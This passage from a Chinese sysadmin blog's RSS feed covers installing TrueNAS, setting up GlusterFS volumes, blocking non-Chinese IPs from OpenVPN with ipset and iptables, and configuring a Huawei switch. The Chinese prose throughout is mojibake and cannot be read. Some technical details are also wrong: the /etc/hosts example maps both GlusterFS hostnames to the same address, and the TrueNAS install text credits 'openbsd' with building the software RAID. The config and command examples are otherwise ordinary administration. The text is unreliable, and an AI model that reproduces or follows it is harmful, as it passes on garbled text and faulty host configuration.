&lt;p&gt;æŠŠä¸»æ¿çš„SATAç»™å…³æ‰ï¼Œç¦æ­¢AHCI&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_134704.png&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_134624.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŒæ ·å…³æ‰sSATAï¼Œä¹Ÿç¦æ­¢AHCI&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_134744.png&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_134808.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åé‡å¯å®‰è£…TrueNASï¼Œè¿™æ¬¡å°±å¯ä»¥é€šè¿‡äº†
å®‰è£…ç›˜é€‰æ‹©å‰ä¸¤å—SSDå°ç›˜ï¼Œ230G
openbsdä¼šè‡ªåŠ¨å°†è¿™ä¸¤æ¬¾å°ç›˜åšæˆè½¯Raid&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_115448.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æç¤ºä¼šæŠ¹æ‰ä¸¤å—ç›˜çš„æ‰€æœ‰æ•°æ®&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_115557.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥rootçš„å¯†ç &lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_115642.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©Boot via BIOS&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_120946.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å»ºç«‹16Gçš„swapç©ºé—´&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_121016.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±å¼€å§‹å®‰è£…ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆåŠ¨é™ï¼Œä¹Ÿæ²¡æœ‰è¿›åº¦æ¡ï¼Œä¼šç­‰å¾ˆä¹…&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_121051.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®‰è£…å®Œæˆåä¼šè®©ä½ é‡å¯ï¼Œç„¶åå‡ºæ¥é…ç½®ç•Œé¢&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_131715.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆè¦é…ç½®ç¬¬äºŒé¡¹ï¼ŒBondingç«¯å£
ç„¶åå†é…ç¬¬ä¸€é¡¹çš„é™æ€IP
å†é…ç¬¬å››é¡¹ç¼ºçœè·¯ç”±
é…å®Œå°±httpå’Œhttpsæ˜¾ç¤ºæ­£ç¡®åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_132440.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥åœ°å€ï¼šhttp://172.18.30.97
ç™»å½•å°±å®Œæˆå®‰è£…äº†&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20230330-truenas_install/2021-08-25_140955.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>GlusterFSçš„å®é™…åº”ç”¨</title>
      <link>https://rendoumi.com/posts/20230330-glusterfs/</link>
      <pubDate>Thu, 30 Mar 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230330-glusterfs/</guid>
      <description>&lt;h2 id=&#34;ç‰¹åˆ«æ³¨æ„&#34;&gt;ç‰¹åˆ«æ³¨æ„&lt;/h2&gt;
&lt;p&gt;ä¸¤å°GFSä¸»æœº172.18.30.18å’Œ172.18.30.36ä¸Šé¢åŠ¡å¿…é…ç½®/etc/hostsï¼Œå¦åˆ™peerçš„æ—¶å€™ä¼šæœ‰é—®é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;172.18.30.18 renhe-18-30-18
172.18.30.18 renhe-18-30-36
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å®¢æˆ·ç«¯å®‰è£…&#34;&gt;å®¢æˆ·ç«¯å®‰è£…&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç„¶å yum  install glusterfs-fuse å°±å¯ä»¥äº†
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;æŒ‚è½½&#34;&gt;æŒ‚è½½ï¼š&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;mount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;fstab-è‡ªåŠ¨æŒ‚è½½&#34;&gt;fstab è‡ªåŠ¨æŒ‚è½½&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;åœ¨172183018ä¸Šå»ºç«‹æ–°å·å› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹å°±å¿…é¡»forceäº†&#34;&gt;åœ¨172.18.30.18ä¸Šå»ºç«‹æ–°å·ï¼Œå› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹ï¼Œå°±å¿…é¡»forceäº†&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume create test-zhichi-vol replica &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å¯åŠ¨&#34;&gt;å¯åŠ¨&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;gluster volume start test-zhichi-vol&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;æŸ¥çœ‹ä¸€ä¸‹&#34;&gt;æŸ¥çœ‹ä¸€ä¸‹&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;gluster volume info test-zhichi-vol&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;æŸ¥çœ‹å·ä¿¡æ¯ç¦æ­¢æŸ¥çœ‹inodeå¤ªå¤šäº†&#34;&gt;æŸ¥çœ‹å·ä¿¡æ¯(ç¦æ­¢æŸ¥çœ‹inodeï¼Œå¤ªå¤šäº†)&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume status test-zhichi-vol detail
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume status test-zhichi-vol clients
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume status test-zhichi-vol mem
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume status test-zhichi-vol fd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume status test-zhichi-vol inode
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å¼€å¯é™é¢&#34;&gt;å¼€å¯é™é¢&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-zhichi-vol &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-zhichi-vol limit-usage / 50GB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume quota test-zhichi-vol list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;é™åˆ¶ipè®¿é—®&#34;&gt;é™åˆ¶IPè®¿é—®&lt;/h4&gt;
&lt;p&gt;ä¾‹å¦‚å…è®¸172.18.31.*ç½‘æ®µçš„ä¸»æœºè®¿é—®rep-volumeï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä½¿ç”¨ipsetæ¥ç¦æ­¢å›½å¤–çš„ç”¨æˆ·ç™»å½•openvpn</title>
      <link>https://rendoumi.com/posts/20230329-ipset_block/</link>
      <pubDate>Wed, 29 Mar 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230329-ipset_block/</guid>
      <description>&lt;p&gt;çªç„¶æ¥çš„ä¸ªéœ€æ±‚ï¼Œè¦æ±‚å±è”½å›½å¤–çš„ç”¨æˆ·ç™»å½•å…¬å¸çš„openvpnï¼Œé˜²æ­¢æ»¥ç”¨ï¼Œæœäº†ä¸€ä¸‹æ•™ç¨‹å€’æ˜¯çœŸä¸å°‘ï¼Œé—®é¢˜ä¸å°‘éƒ½æ˜¯è¦å»ä¸‹è½½é‚£ä¸ªæ— æ¯”å¤§çš„ipåœ°å€åº“ï¼Œå¥½ä¸å®¹æ˜“æ‰¾äº†ä¸€ä¸ªå¯ç”¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸‹æ¥ï¼Œå¤‡ç”¨ï¼ŒåŸç†å¾ˆç®€å•ï¼Œipsetå»ºç«‹ä¸€ä¸ªchinaçš„hashsetï¼Œä¸åœæ·»åŠ æ¡ç›®ï¼Œæœ€åç”¨iptalbesé˜»æŒ¡ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;ipset create china hash:net hashsize &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt; maxelem &lt;span class=&#34;m&#34;&gt;1000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipset add china 1.0.1.0/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipset add china 91.234.36.0/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -I INPUT -m &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; --match-set china src -p udp -m udp --dport &lt;span class=&#34;m&#34;&gt;1194&lt;/span&gt; -j ACCEPT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -A INPUT -p udp --dport &lt;span class=&#34;m&#34;&gt;1194&lt;/span&gt; -j DROP
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›¸åº”è„šæœ¬çš„ä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;ipset-rules.txt&#34;&gt;ipset-rules.txt&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ ¸å¿ƒäº¤æ¢æœºçš„é…ç½®è¿‡ç¨‹</title>
      <link>https://rendoumi.com/posts/20230324-huawei_switch/</link>
      <pubDate>Fri, 24 Mar 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230324-huawei_switch/</guid>
      <description>&lt;p&gt;æ¢äº†å…¬å¸ï¼Œä¹Ÿæèµ·äº†æ¡Œé¢è¿ç»´ï¼Œé…ç½®äº¤æ¢æœºçš„è¿‡ç¨‹è®°å½•ä¸€ä¸‹ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å‘½ä»¤è®°ä¸ä½ã€‚&lt;/p&gt;
&lt;p&gt;æ‹¿åˆ°ä¸€å°åä¸ºäº¤æ¢æœºï¼Œé‡æ–°åˆå§‹åŒ–åï¼Œé…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;HUAWEI&amp;gt;dis cur
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;!Software Version V200R008C00SPC500
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysname HUAWEI
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; authentication-scheme default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; authorization-scheme default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; accounting-scheme default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; domain default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; domain default_admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; local-user admin password irreversible-cipher %^%#7:.iL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;+u&lt;span class=&#34;s2&#34;&gt;&amp;#34;4\j8ZFhGeg/-m.&amp;amp;&amp;#34;&lt;/span&gt;^0&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;kMznjk%&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;BaUDO/&lt;span class=&#34;s1&#34;&gt;&amp;#39;6m\X\=V8JGY:W;i,%^%#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt; local-user admin service-type http
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;interface Vlanif1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;interface MEth0/0/1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;interface GigabitEthernet0/0/1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#                                         
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;interface NULL0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;user-interface con 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt; authentication-mode password
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt; set authentication password cipher $1a$~!;$-JF0-W$Z&amp;gt;&amp;lt;1.F]&amp;lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3&amp;#39;&lt;/span&gt;9u%+$
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user-interface vty &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user-interface vty &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸€é…åç§°&#34;&gt;ä¸€ã€é…åç§°&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysname BJ_FANGHENG_JIERU
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒé…ç½®ç™»å½•ç”¨æˆ·&#34;&gt;äºŒã€é…ç½®ç™»å½•ç”¨æˆ·&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1ã€aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local-user admin password irreversible-cipher abcdefg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local-user admin privilege level &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local-user admin service-type telnet terminal ssh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2ã€user-interface con &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;authentication-mode aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3ã€user-interface vty &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;authentication-mode aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;protocol inbound all
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸‰é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£&#34;&gt;ä¸‰ã€é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;interface GigabitEthernet0/0/23
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;description&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; H3cSW --&amp;gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; port link-type trunk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; port trunk allow-pass vlan &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; to &lt;span class=&#34;m&#34;&gt;4094&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å››é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£&#34;&gt;å››ã€é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;interface GigabitEthernet0/0/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;description&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; RuijieRoute --&amp;gt; lan0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; port link-type trunk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; port trunk allow-pass vlan &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; to &lt;span class=&#34;m&#34;&gt;4094&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äº”é…ç½®vlanåœ°å€&#34;&gt;äº”ã€é…ç½®vlanåœ°å€&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vlan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vlan &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vlan &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; interface Vlanif11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ip address 10.8.0.7 255.255.254.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vlan &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; interface Vlanif100
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ip address 192.168.10.7 255.255.255.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å…­é…ç½®ç¼ºçœè·¯ç”±&#34;&gt;å…­ã€é…ç½®ç¼ºçœè·¯ç”±&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip route-static 0.0.0.0 0.0.0.0 10.8.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸ƒæ‰¹é‡é…ç½®ç«¯å£&#34;&gt;ä¸ƒã€æ‰¹é‡é…ç½®ç«¯å£&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;port-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;port link-type access
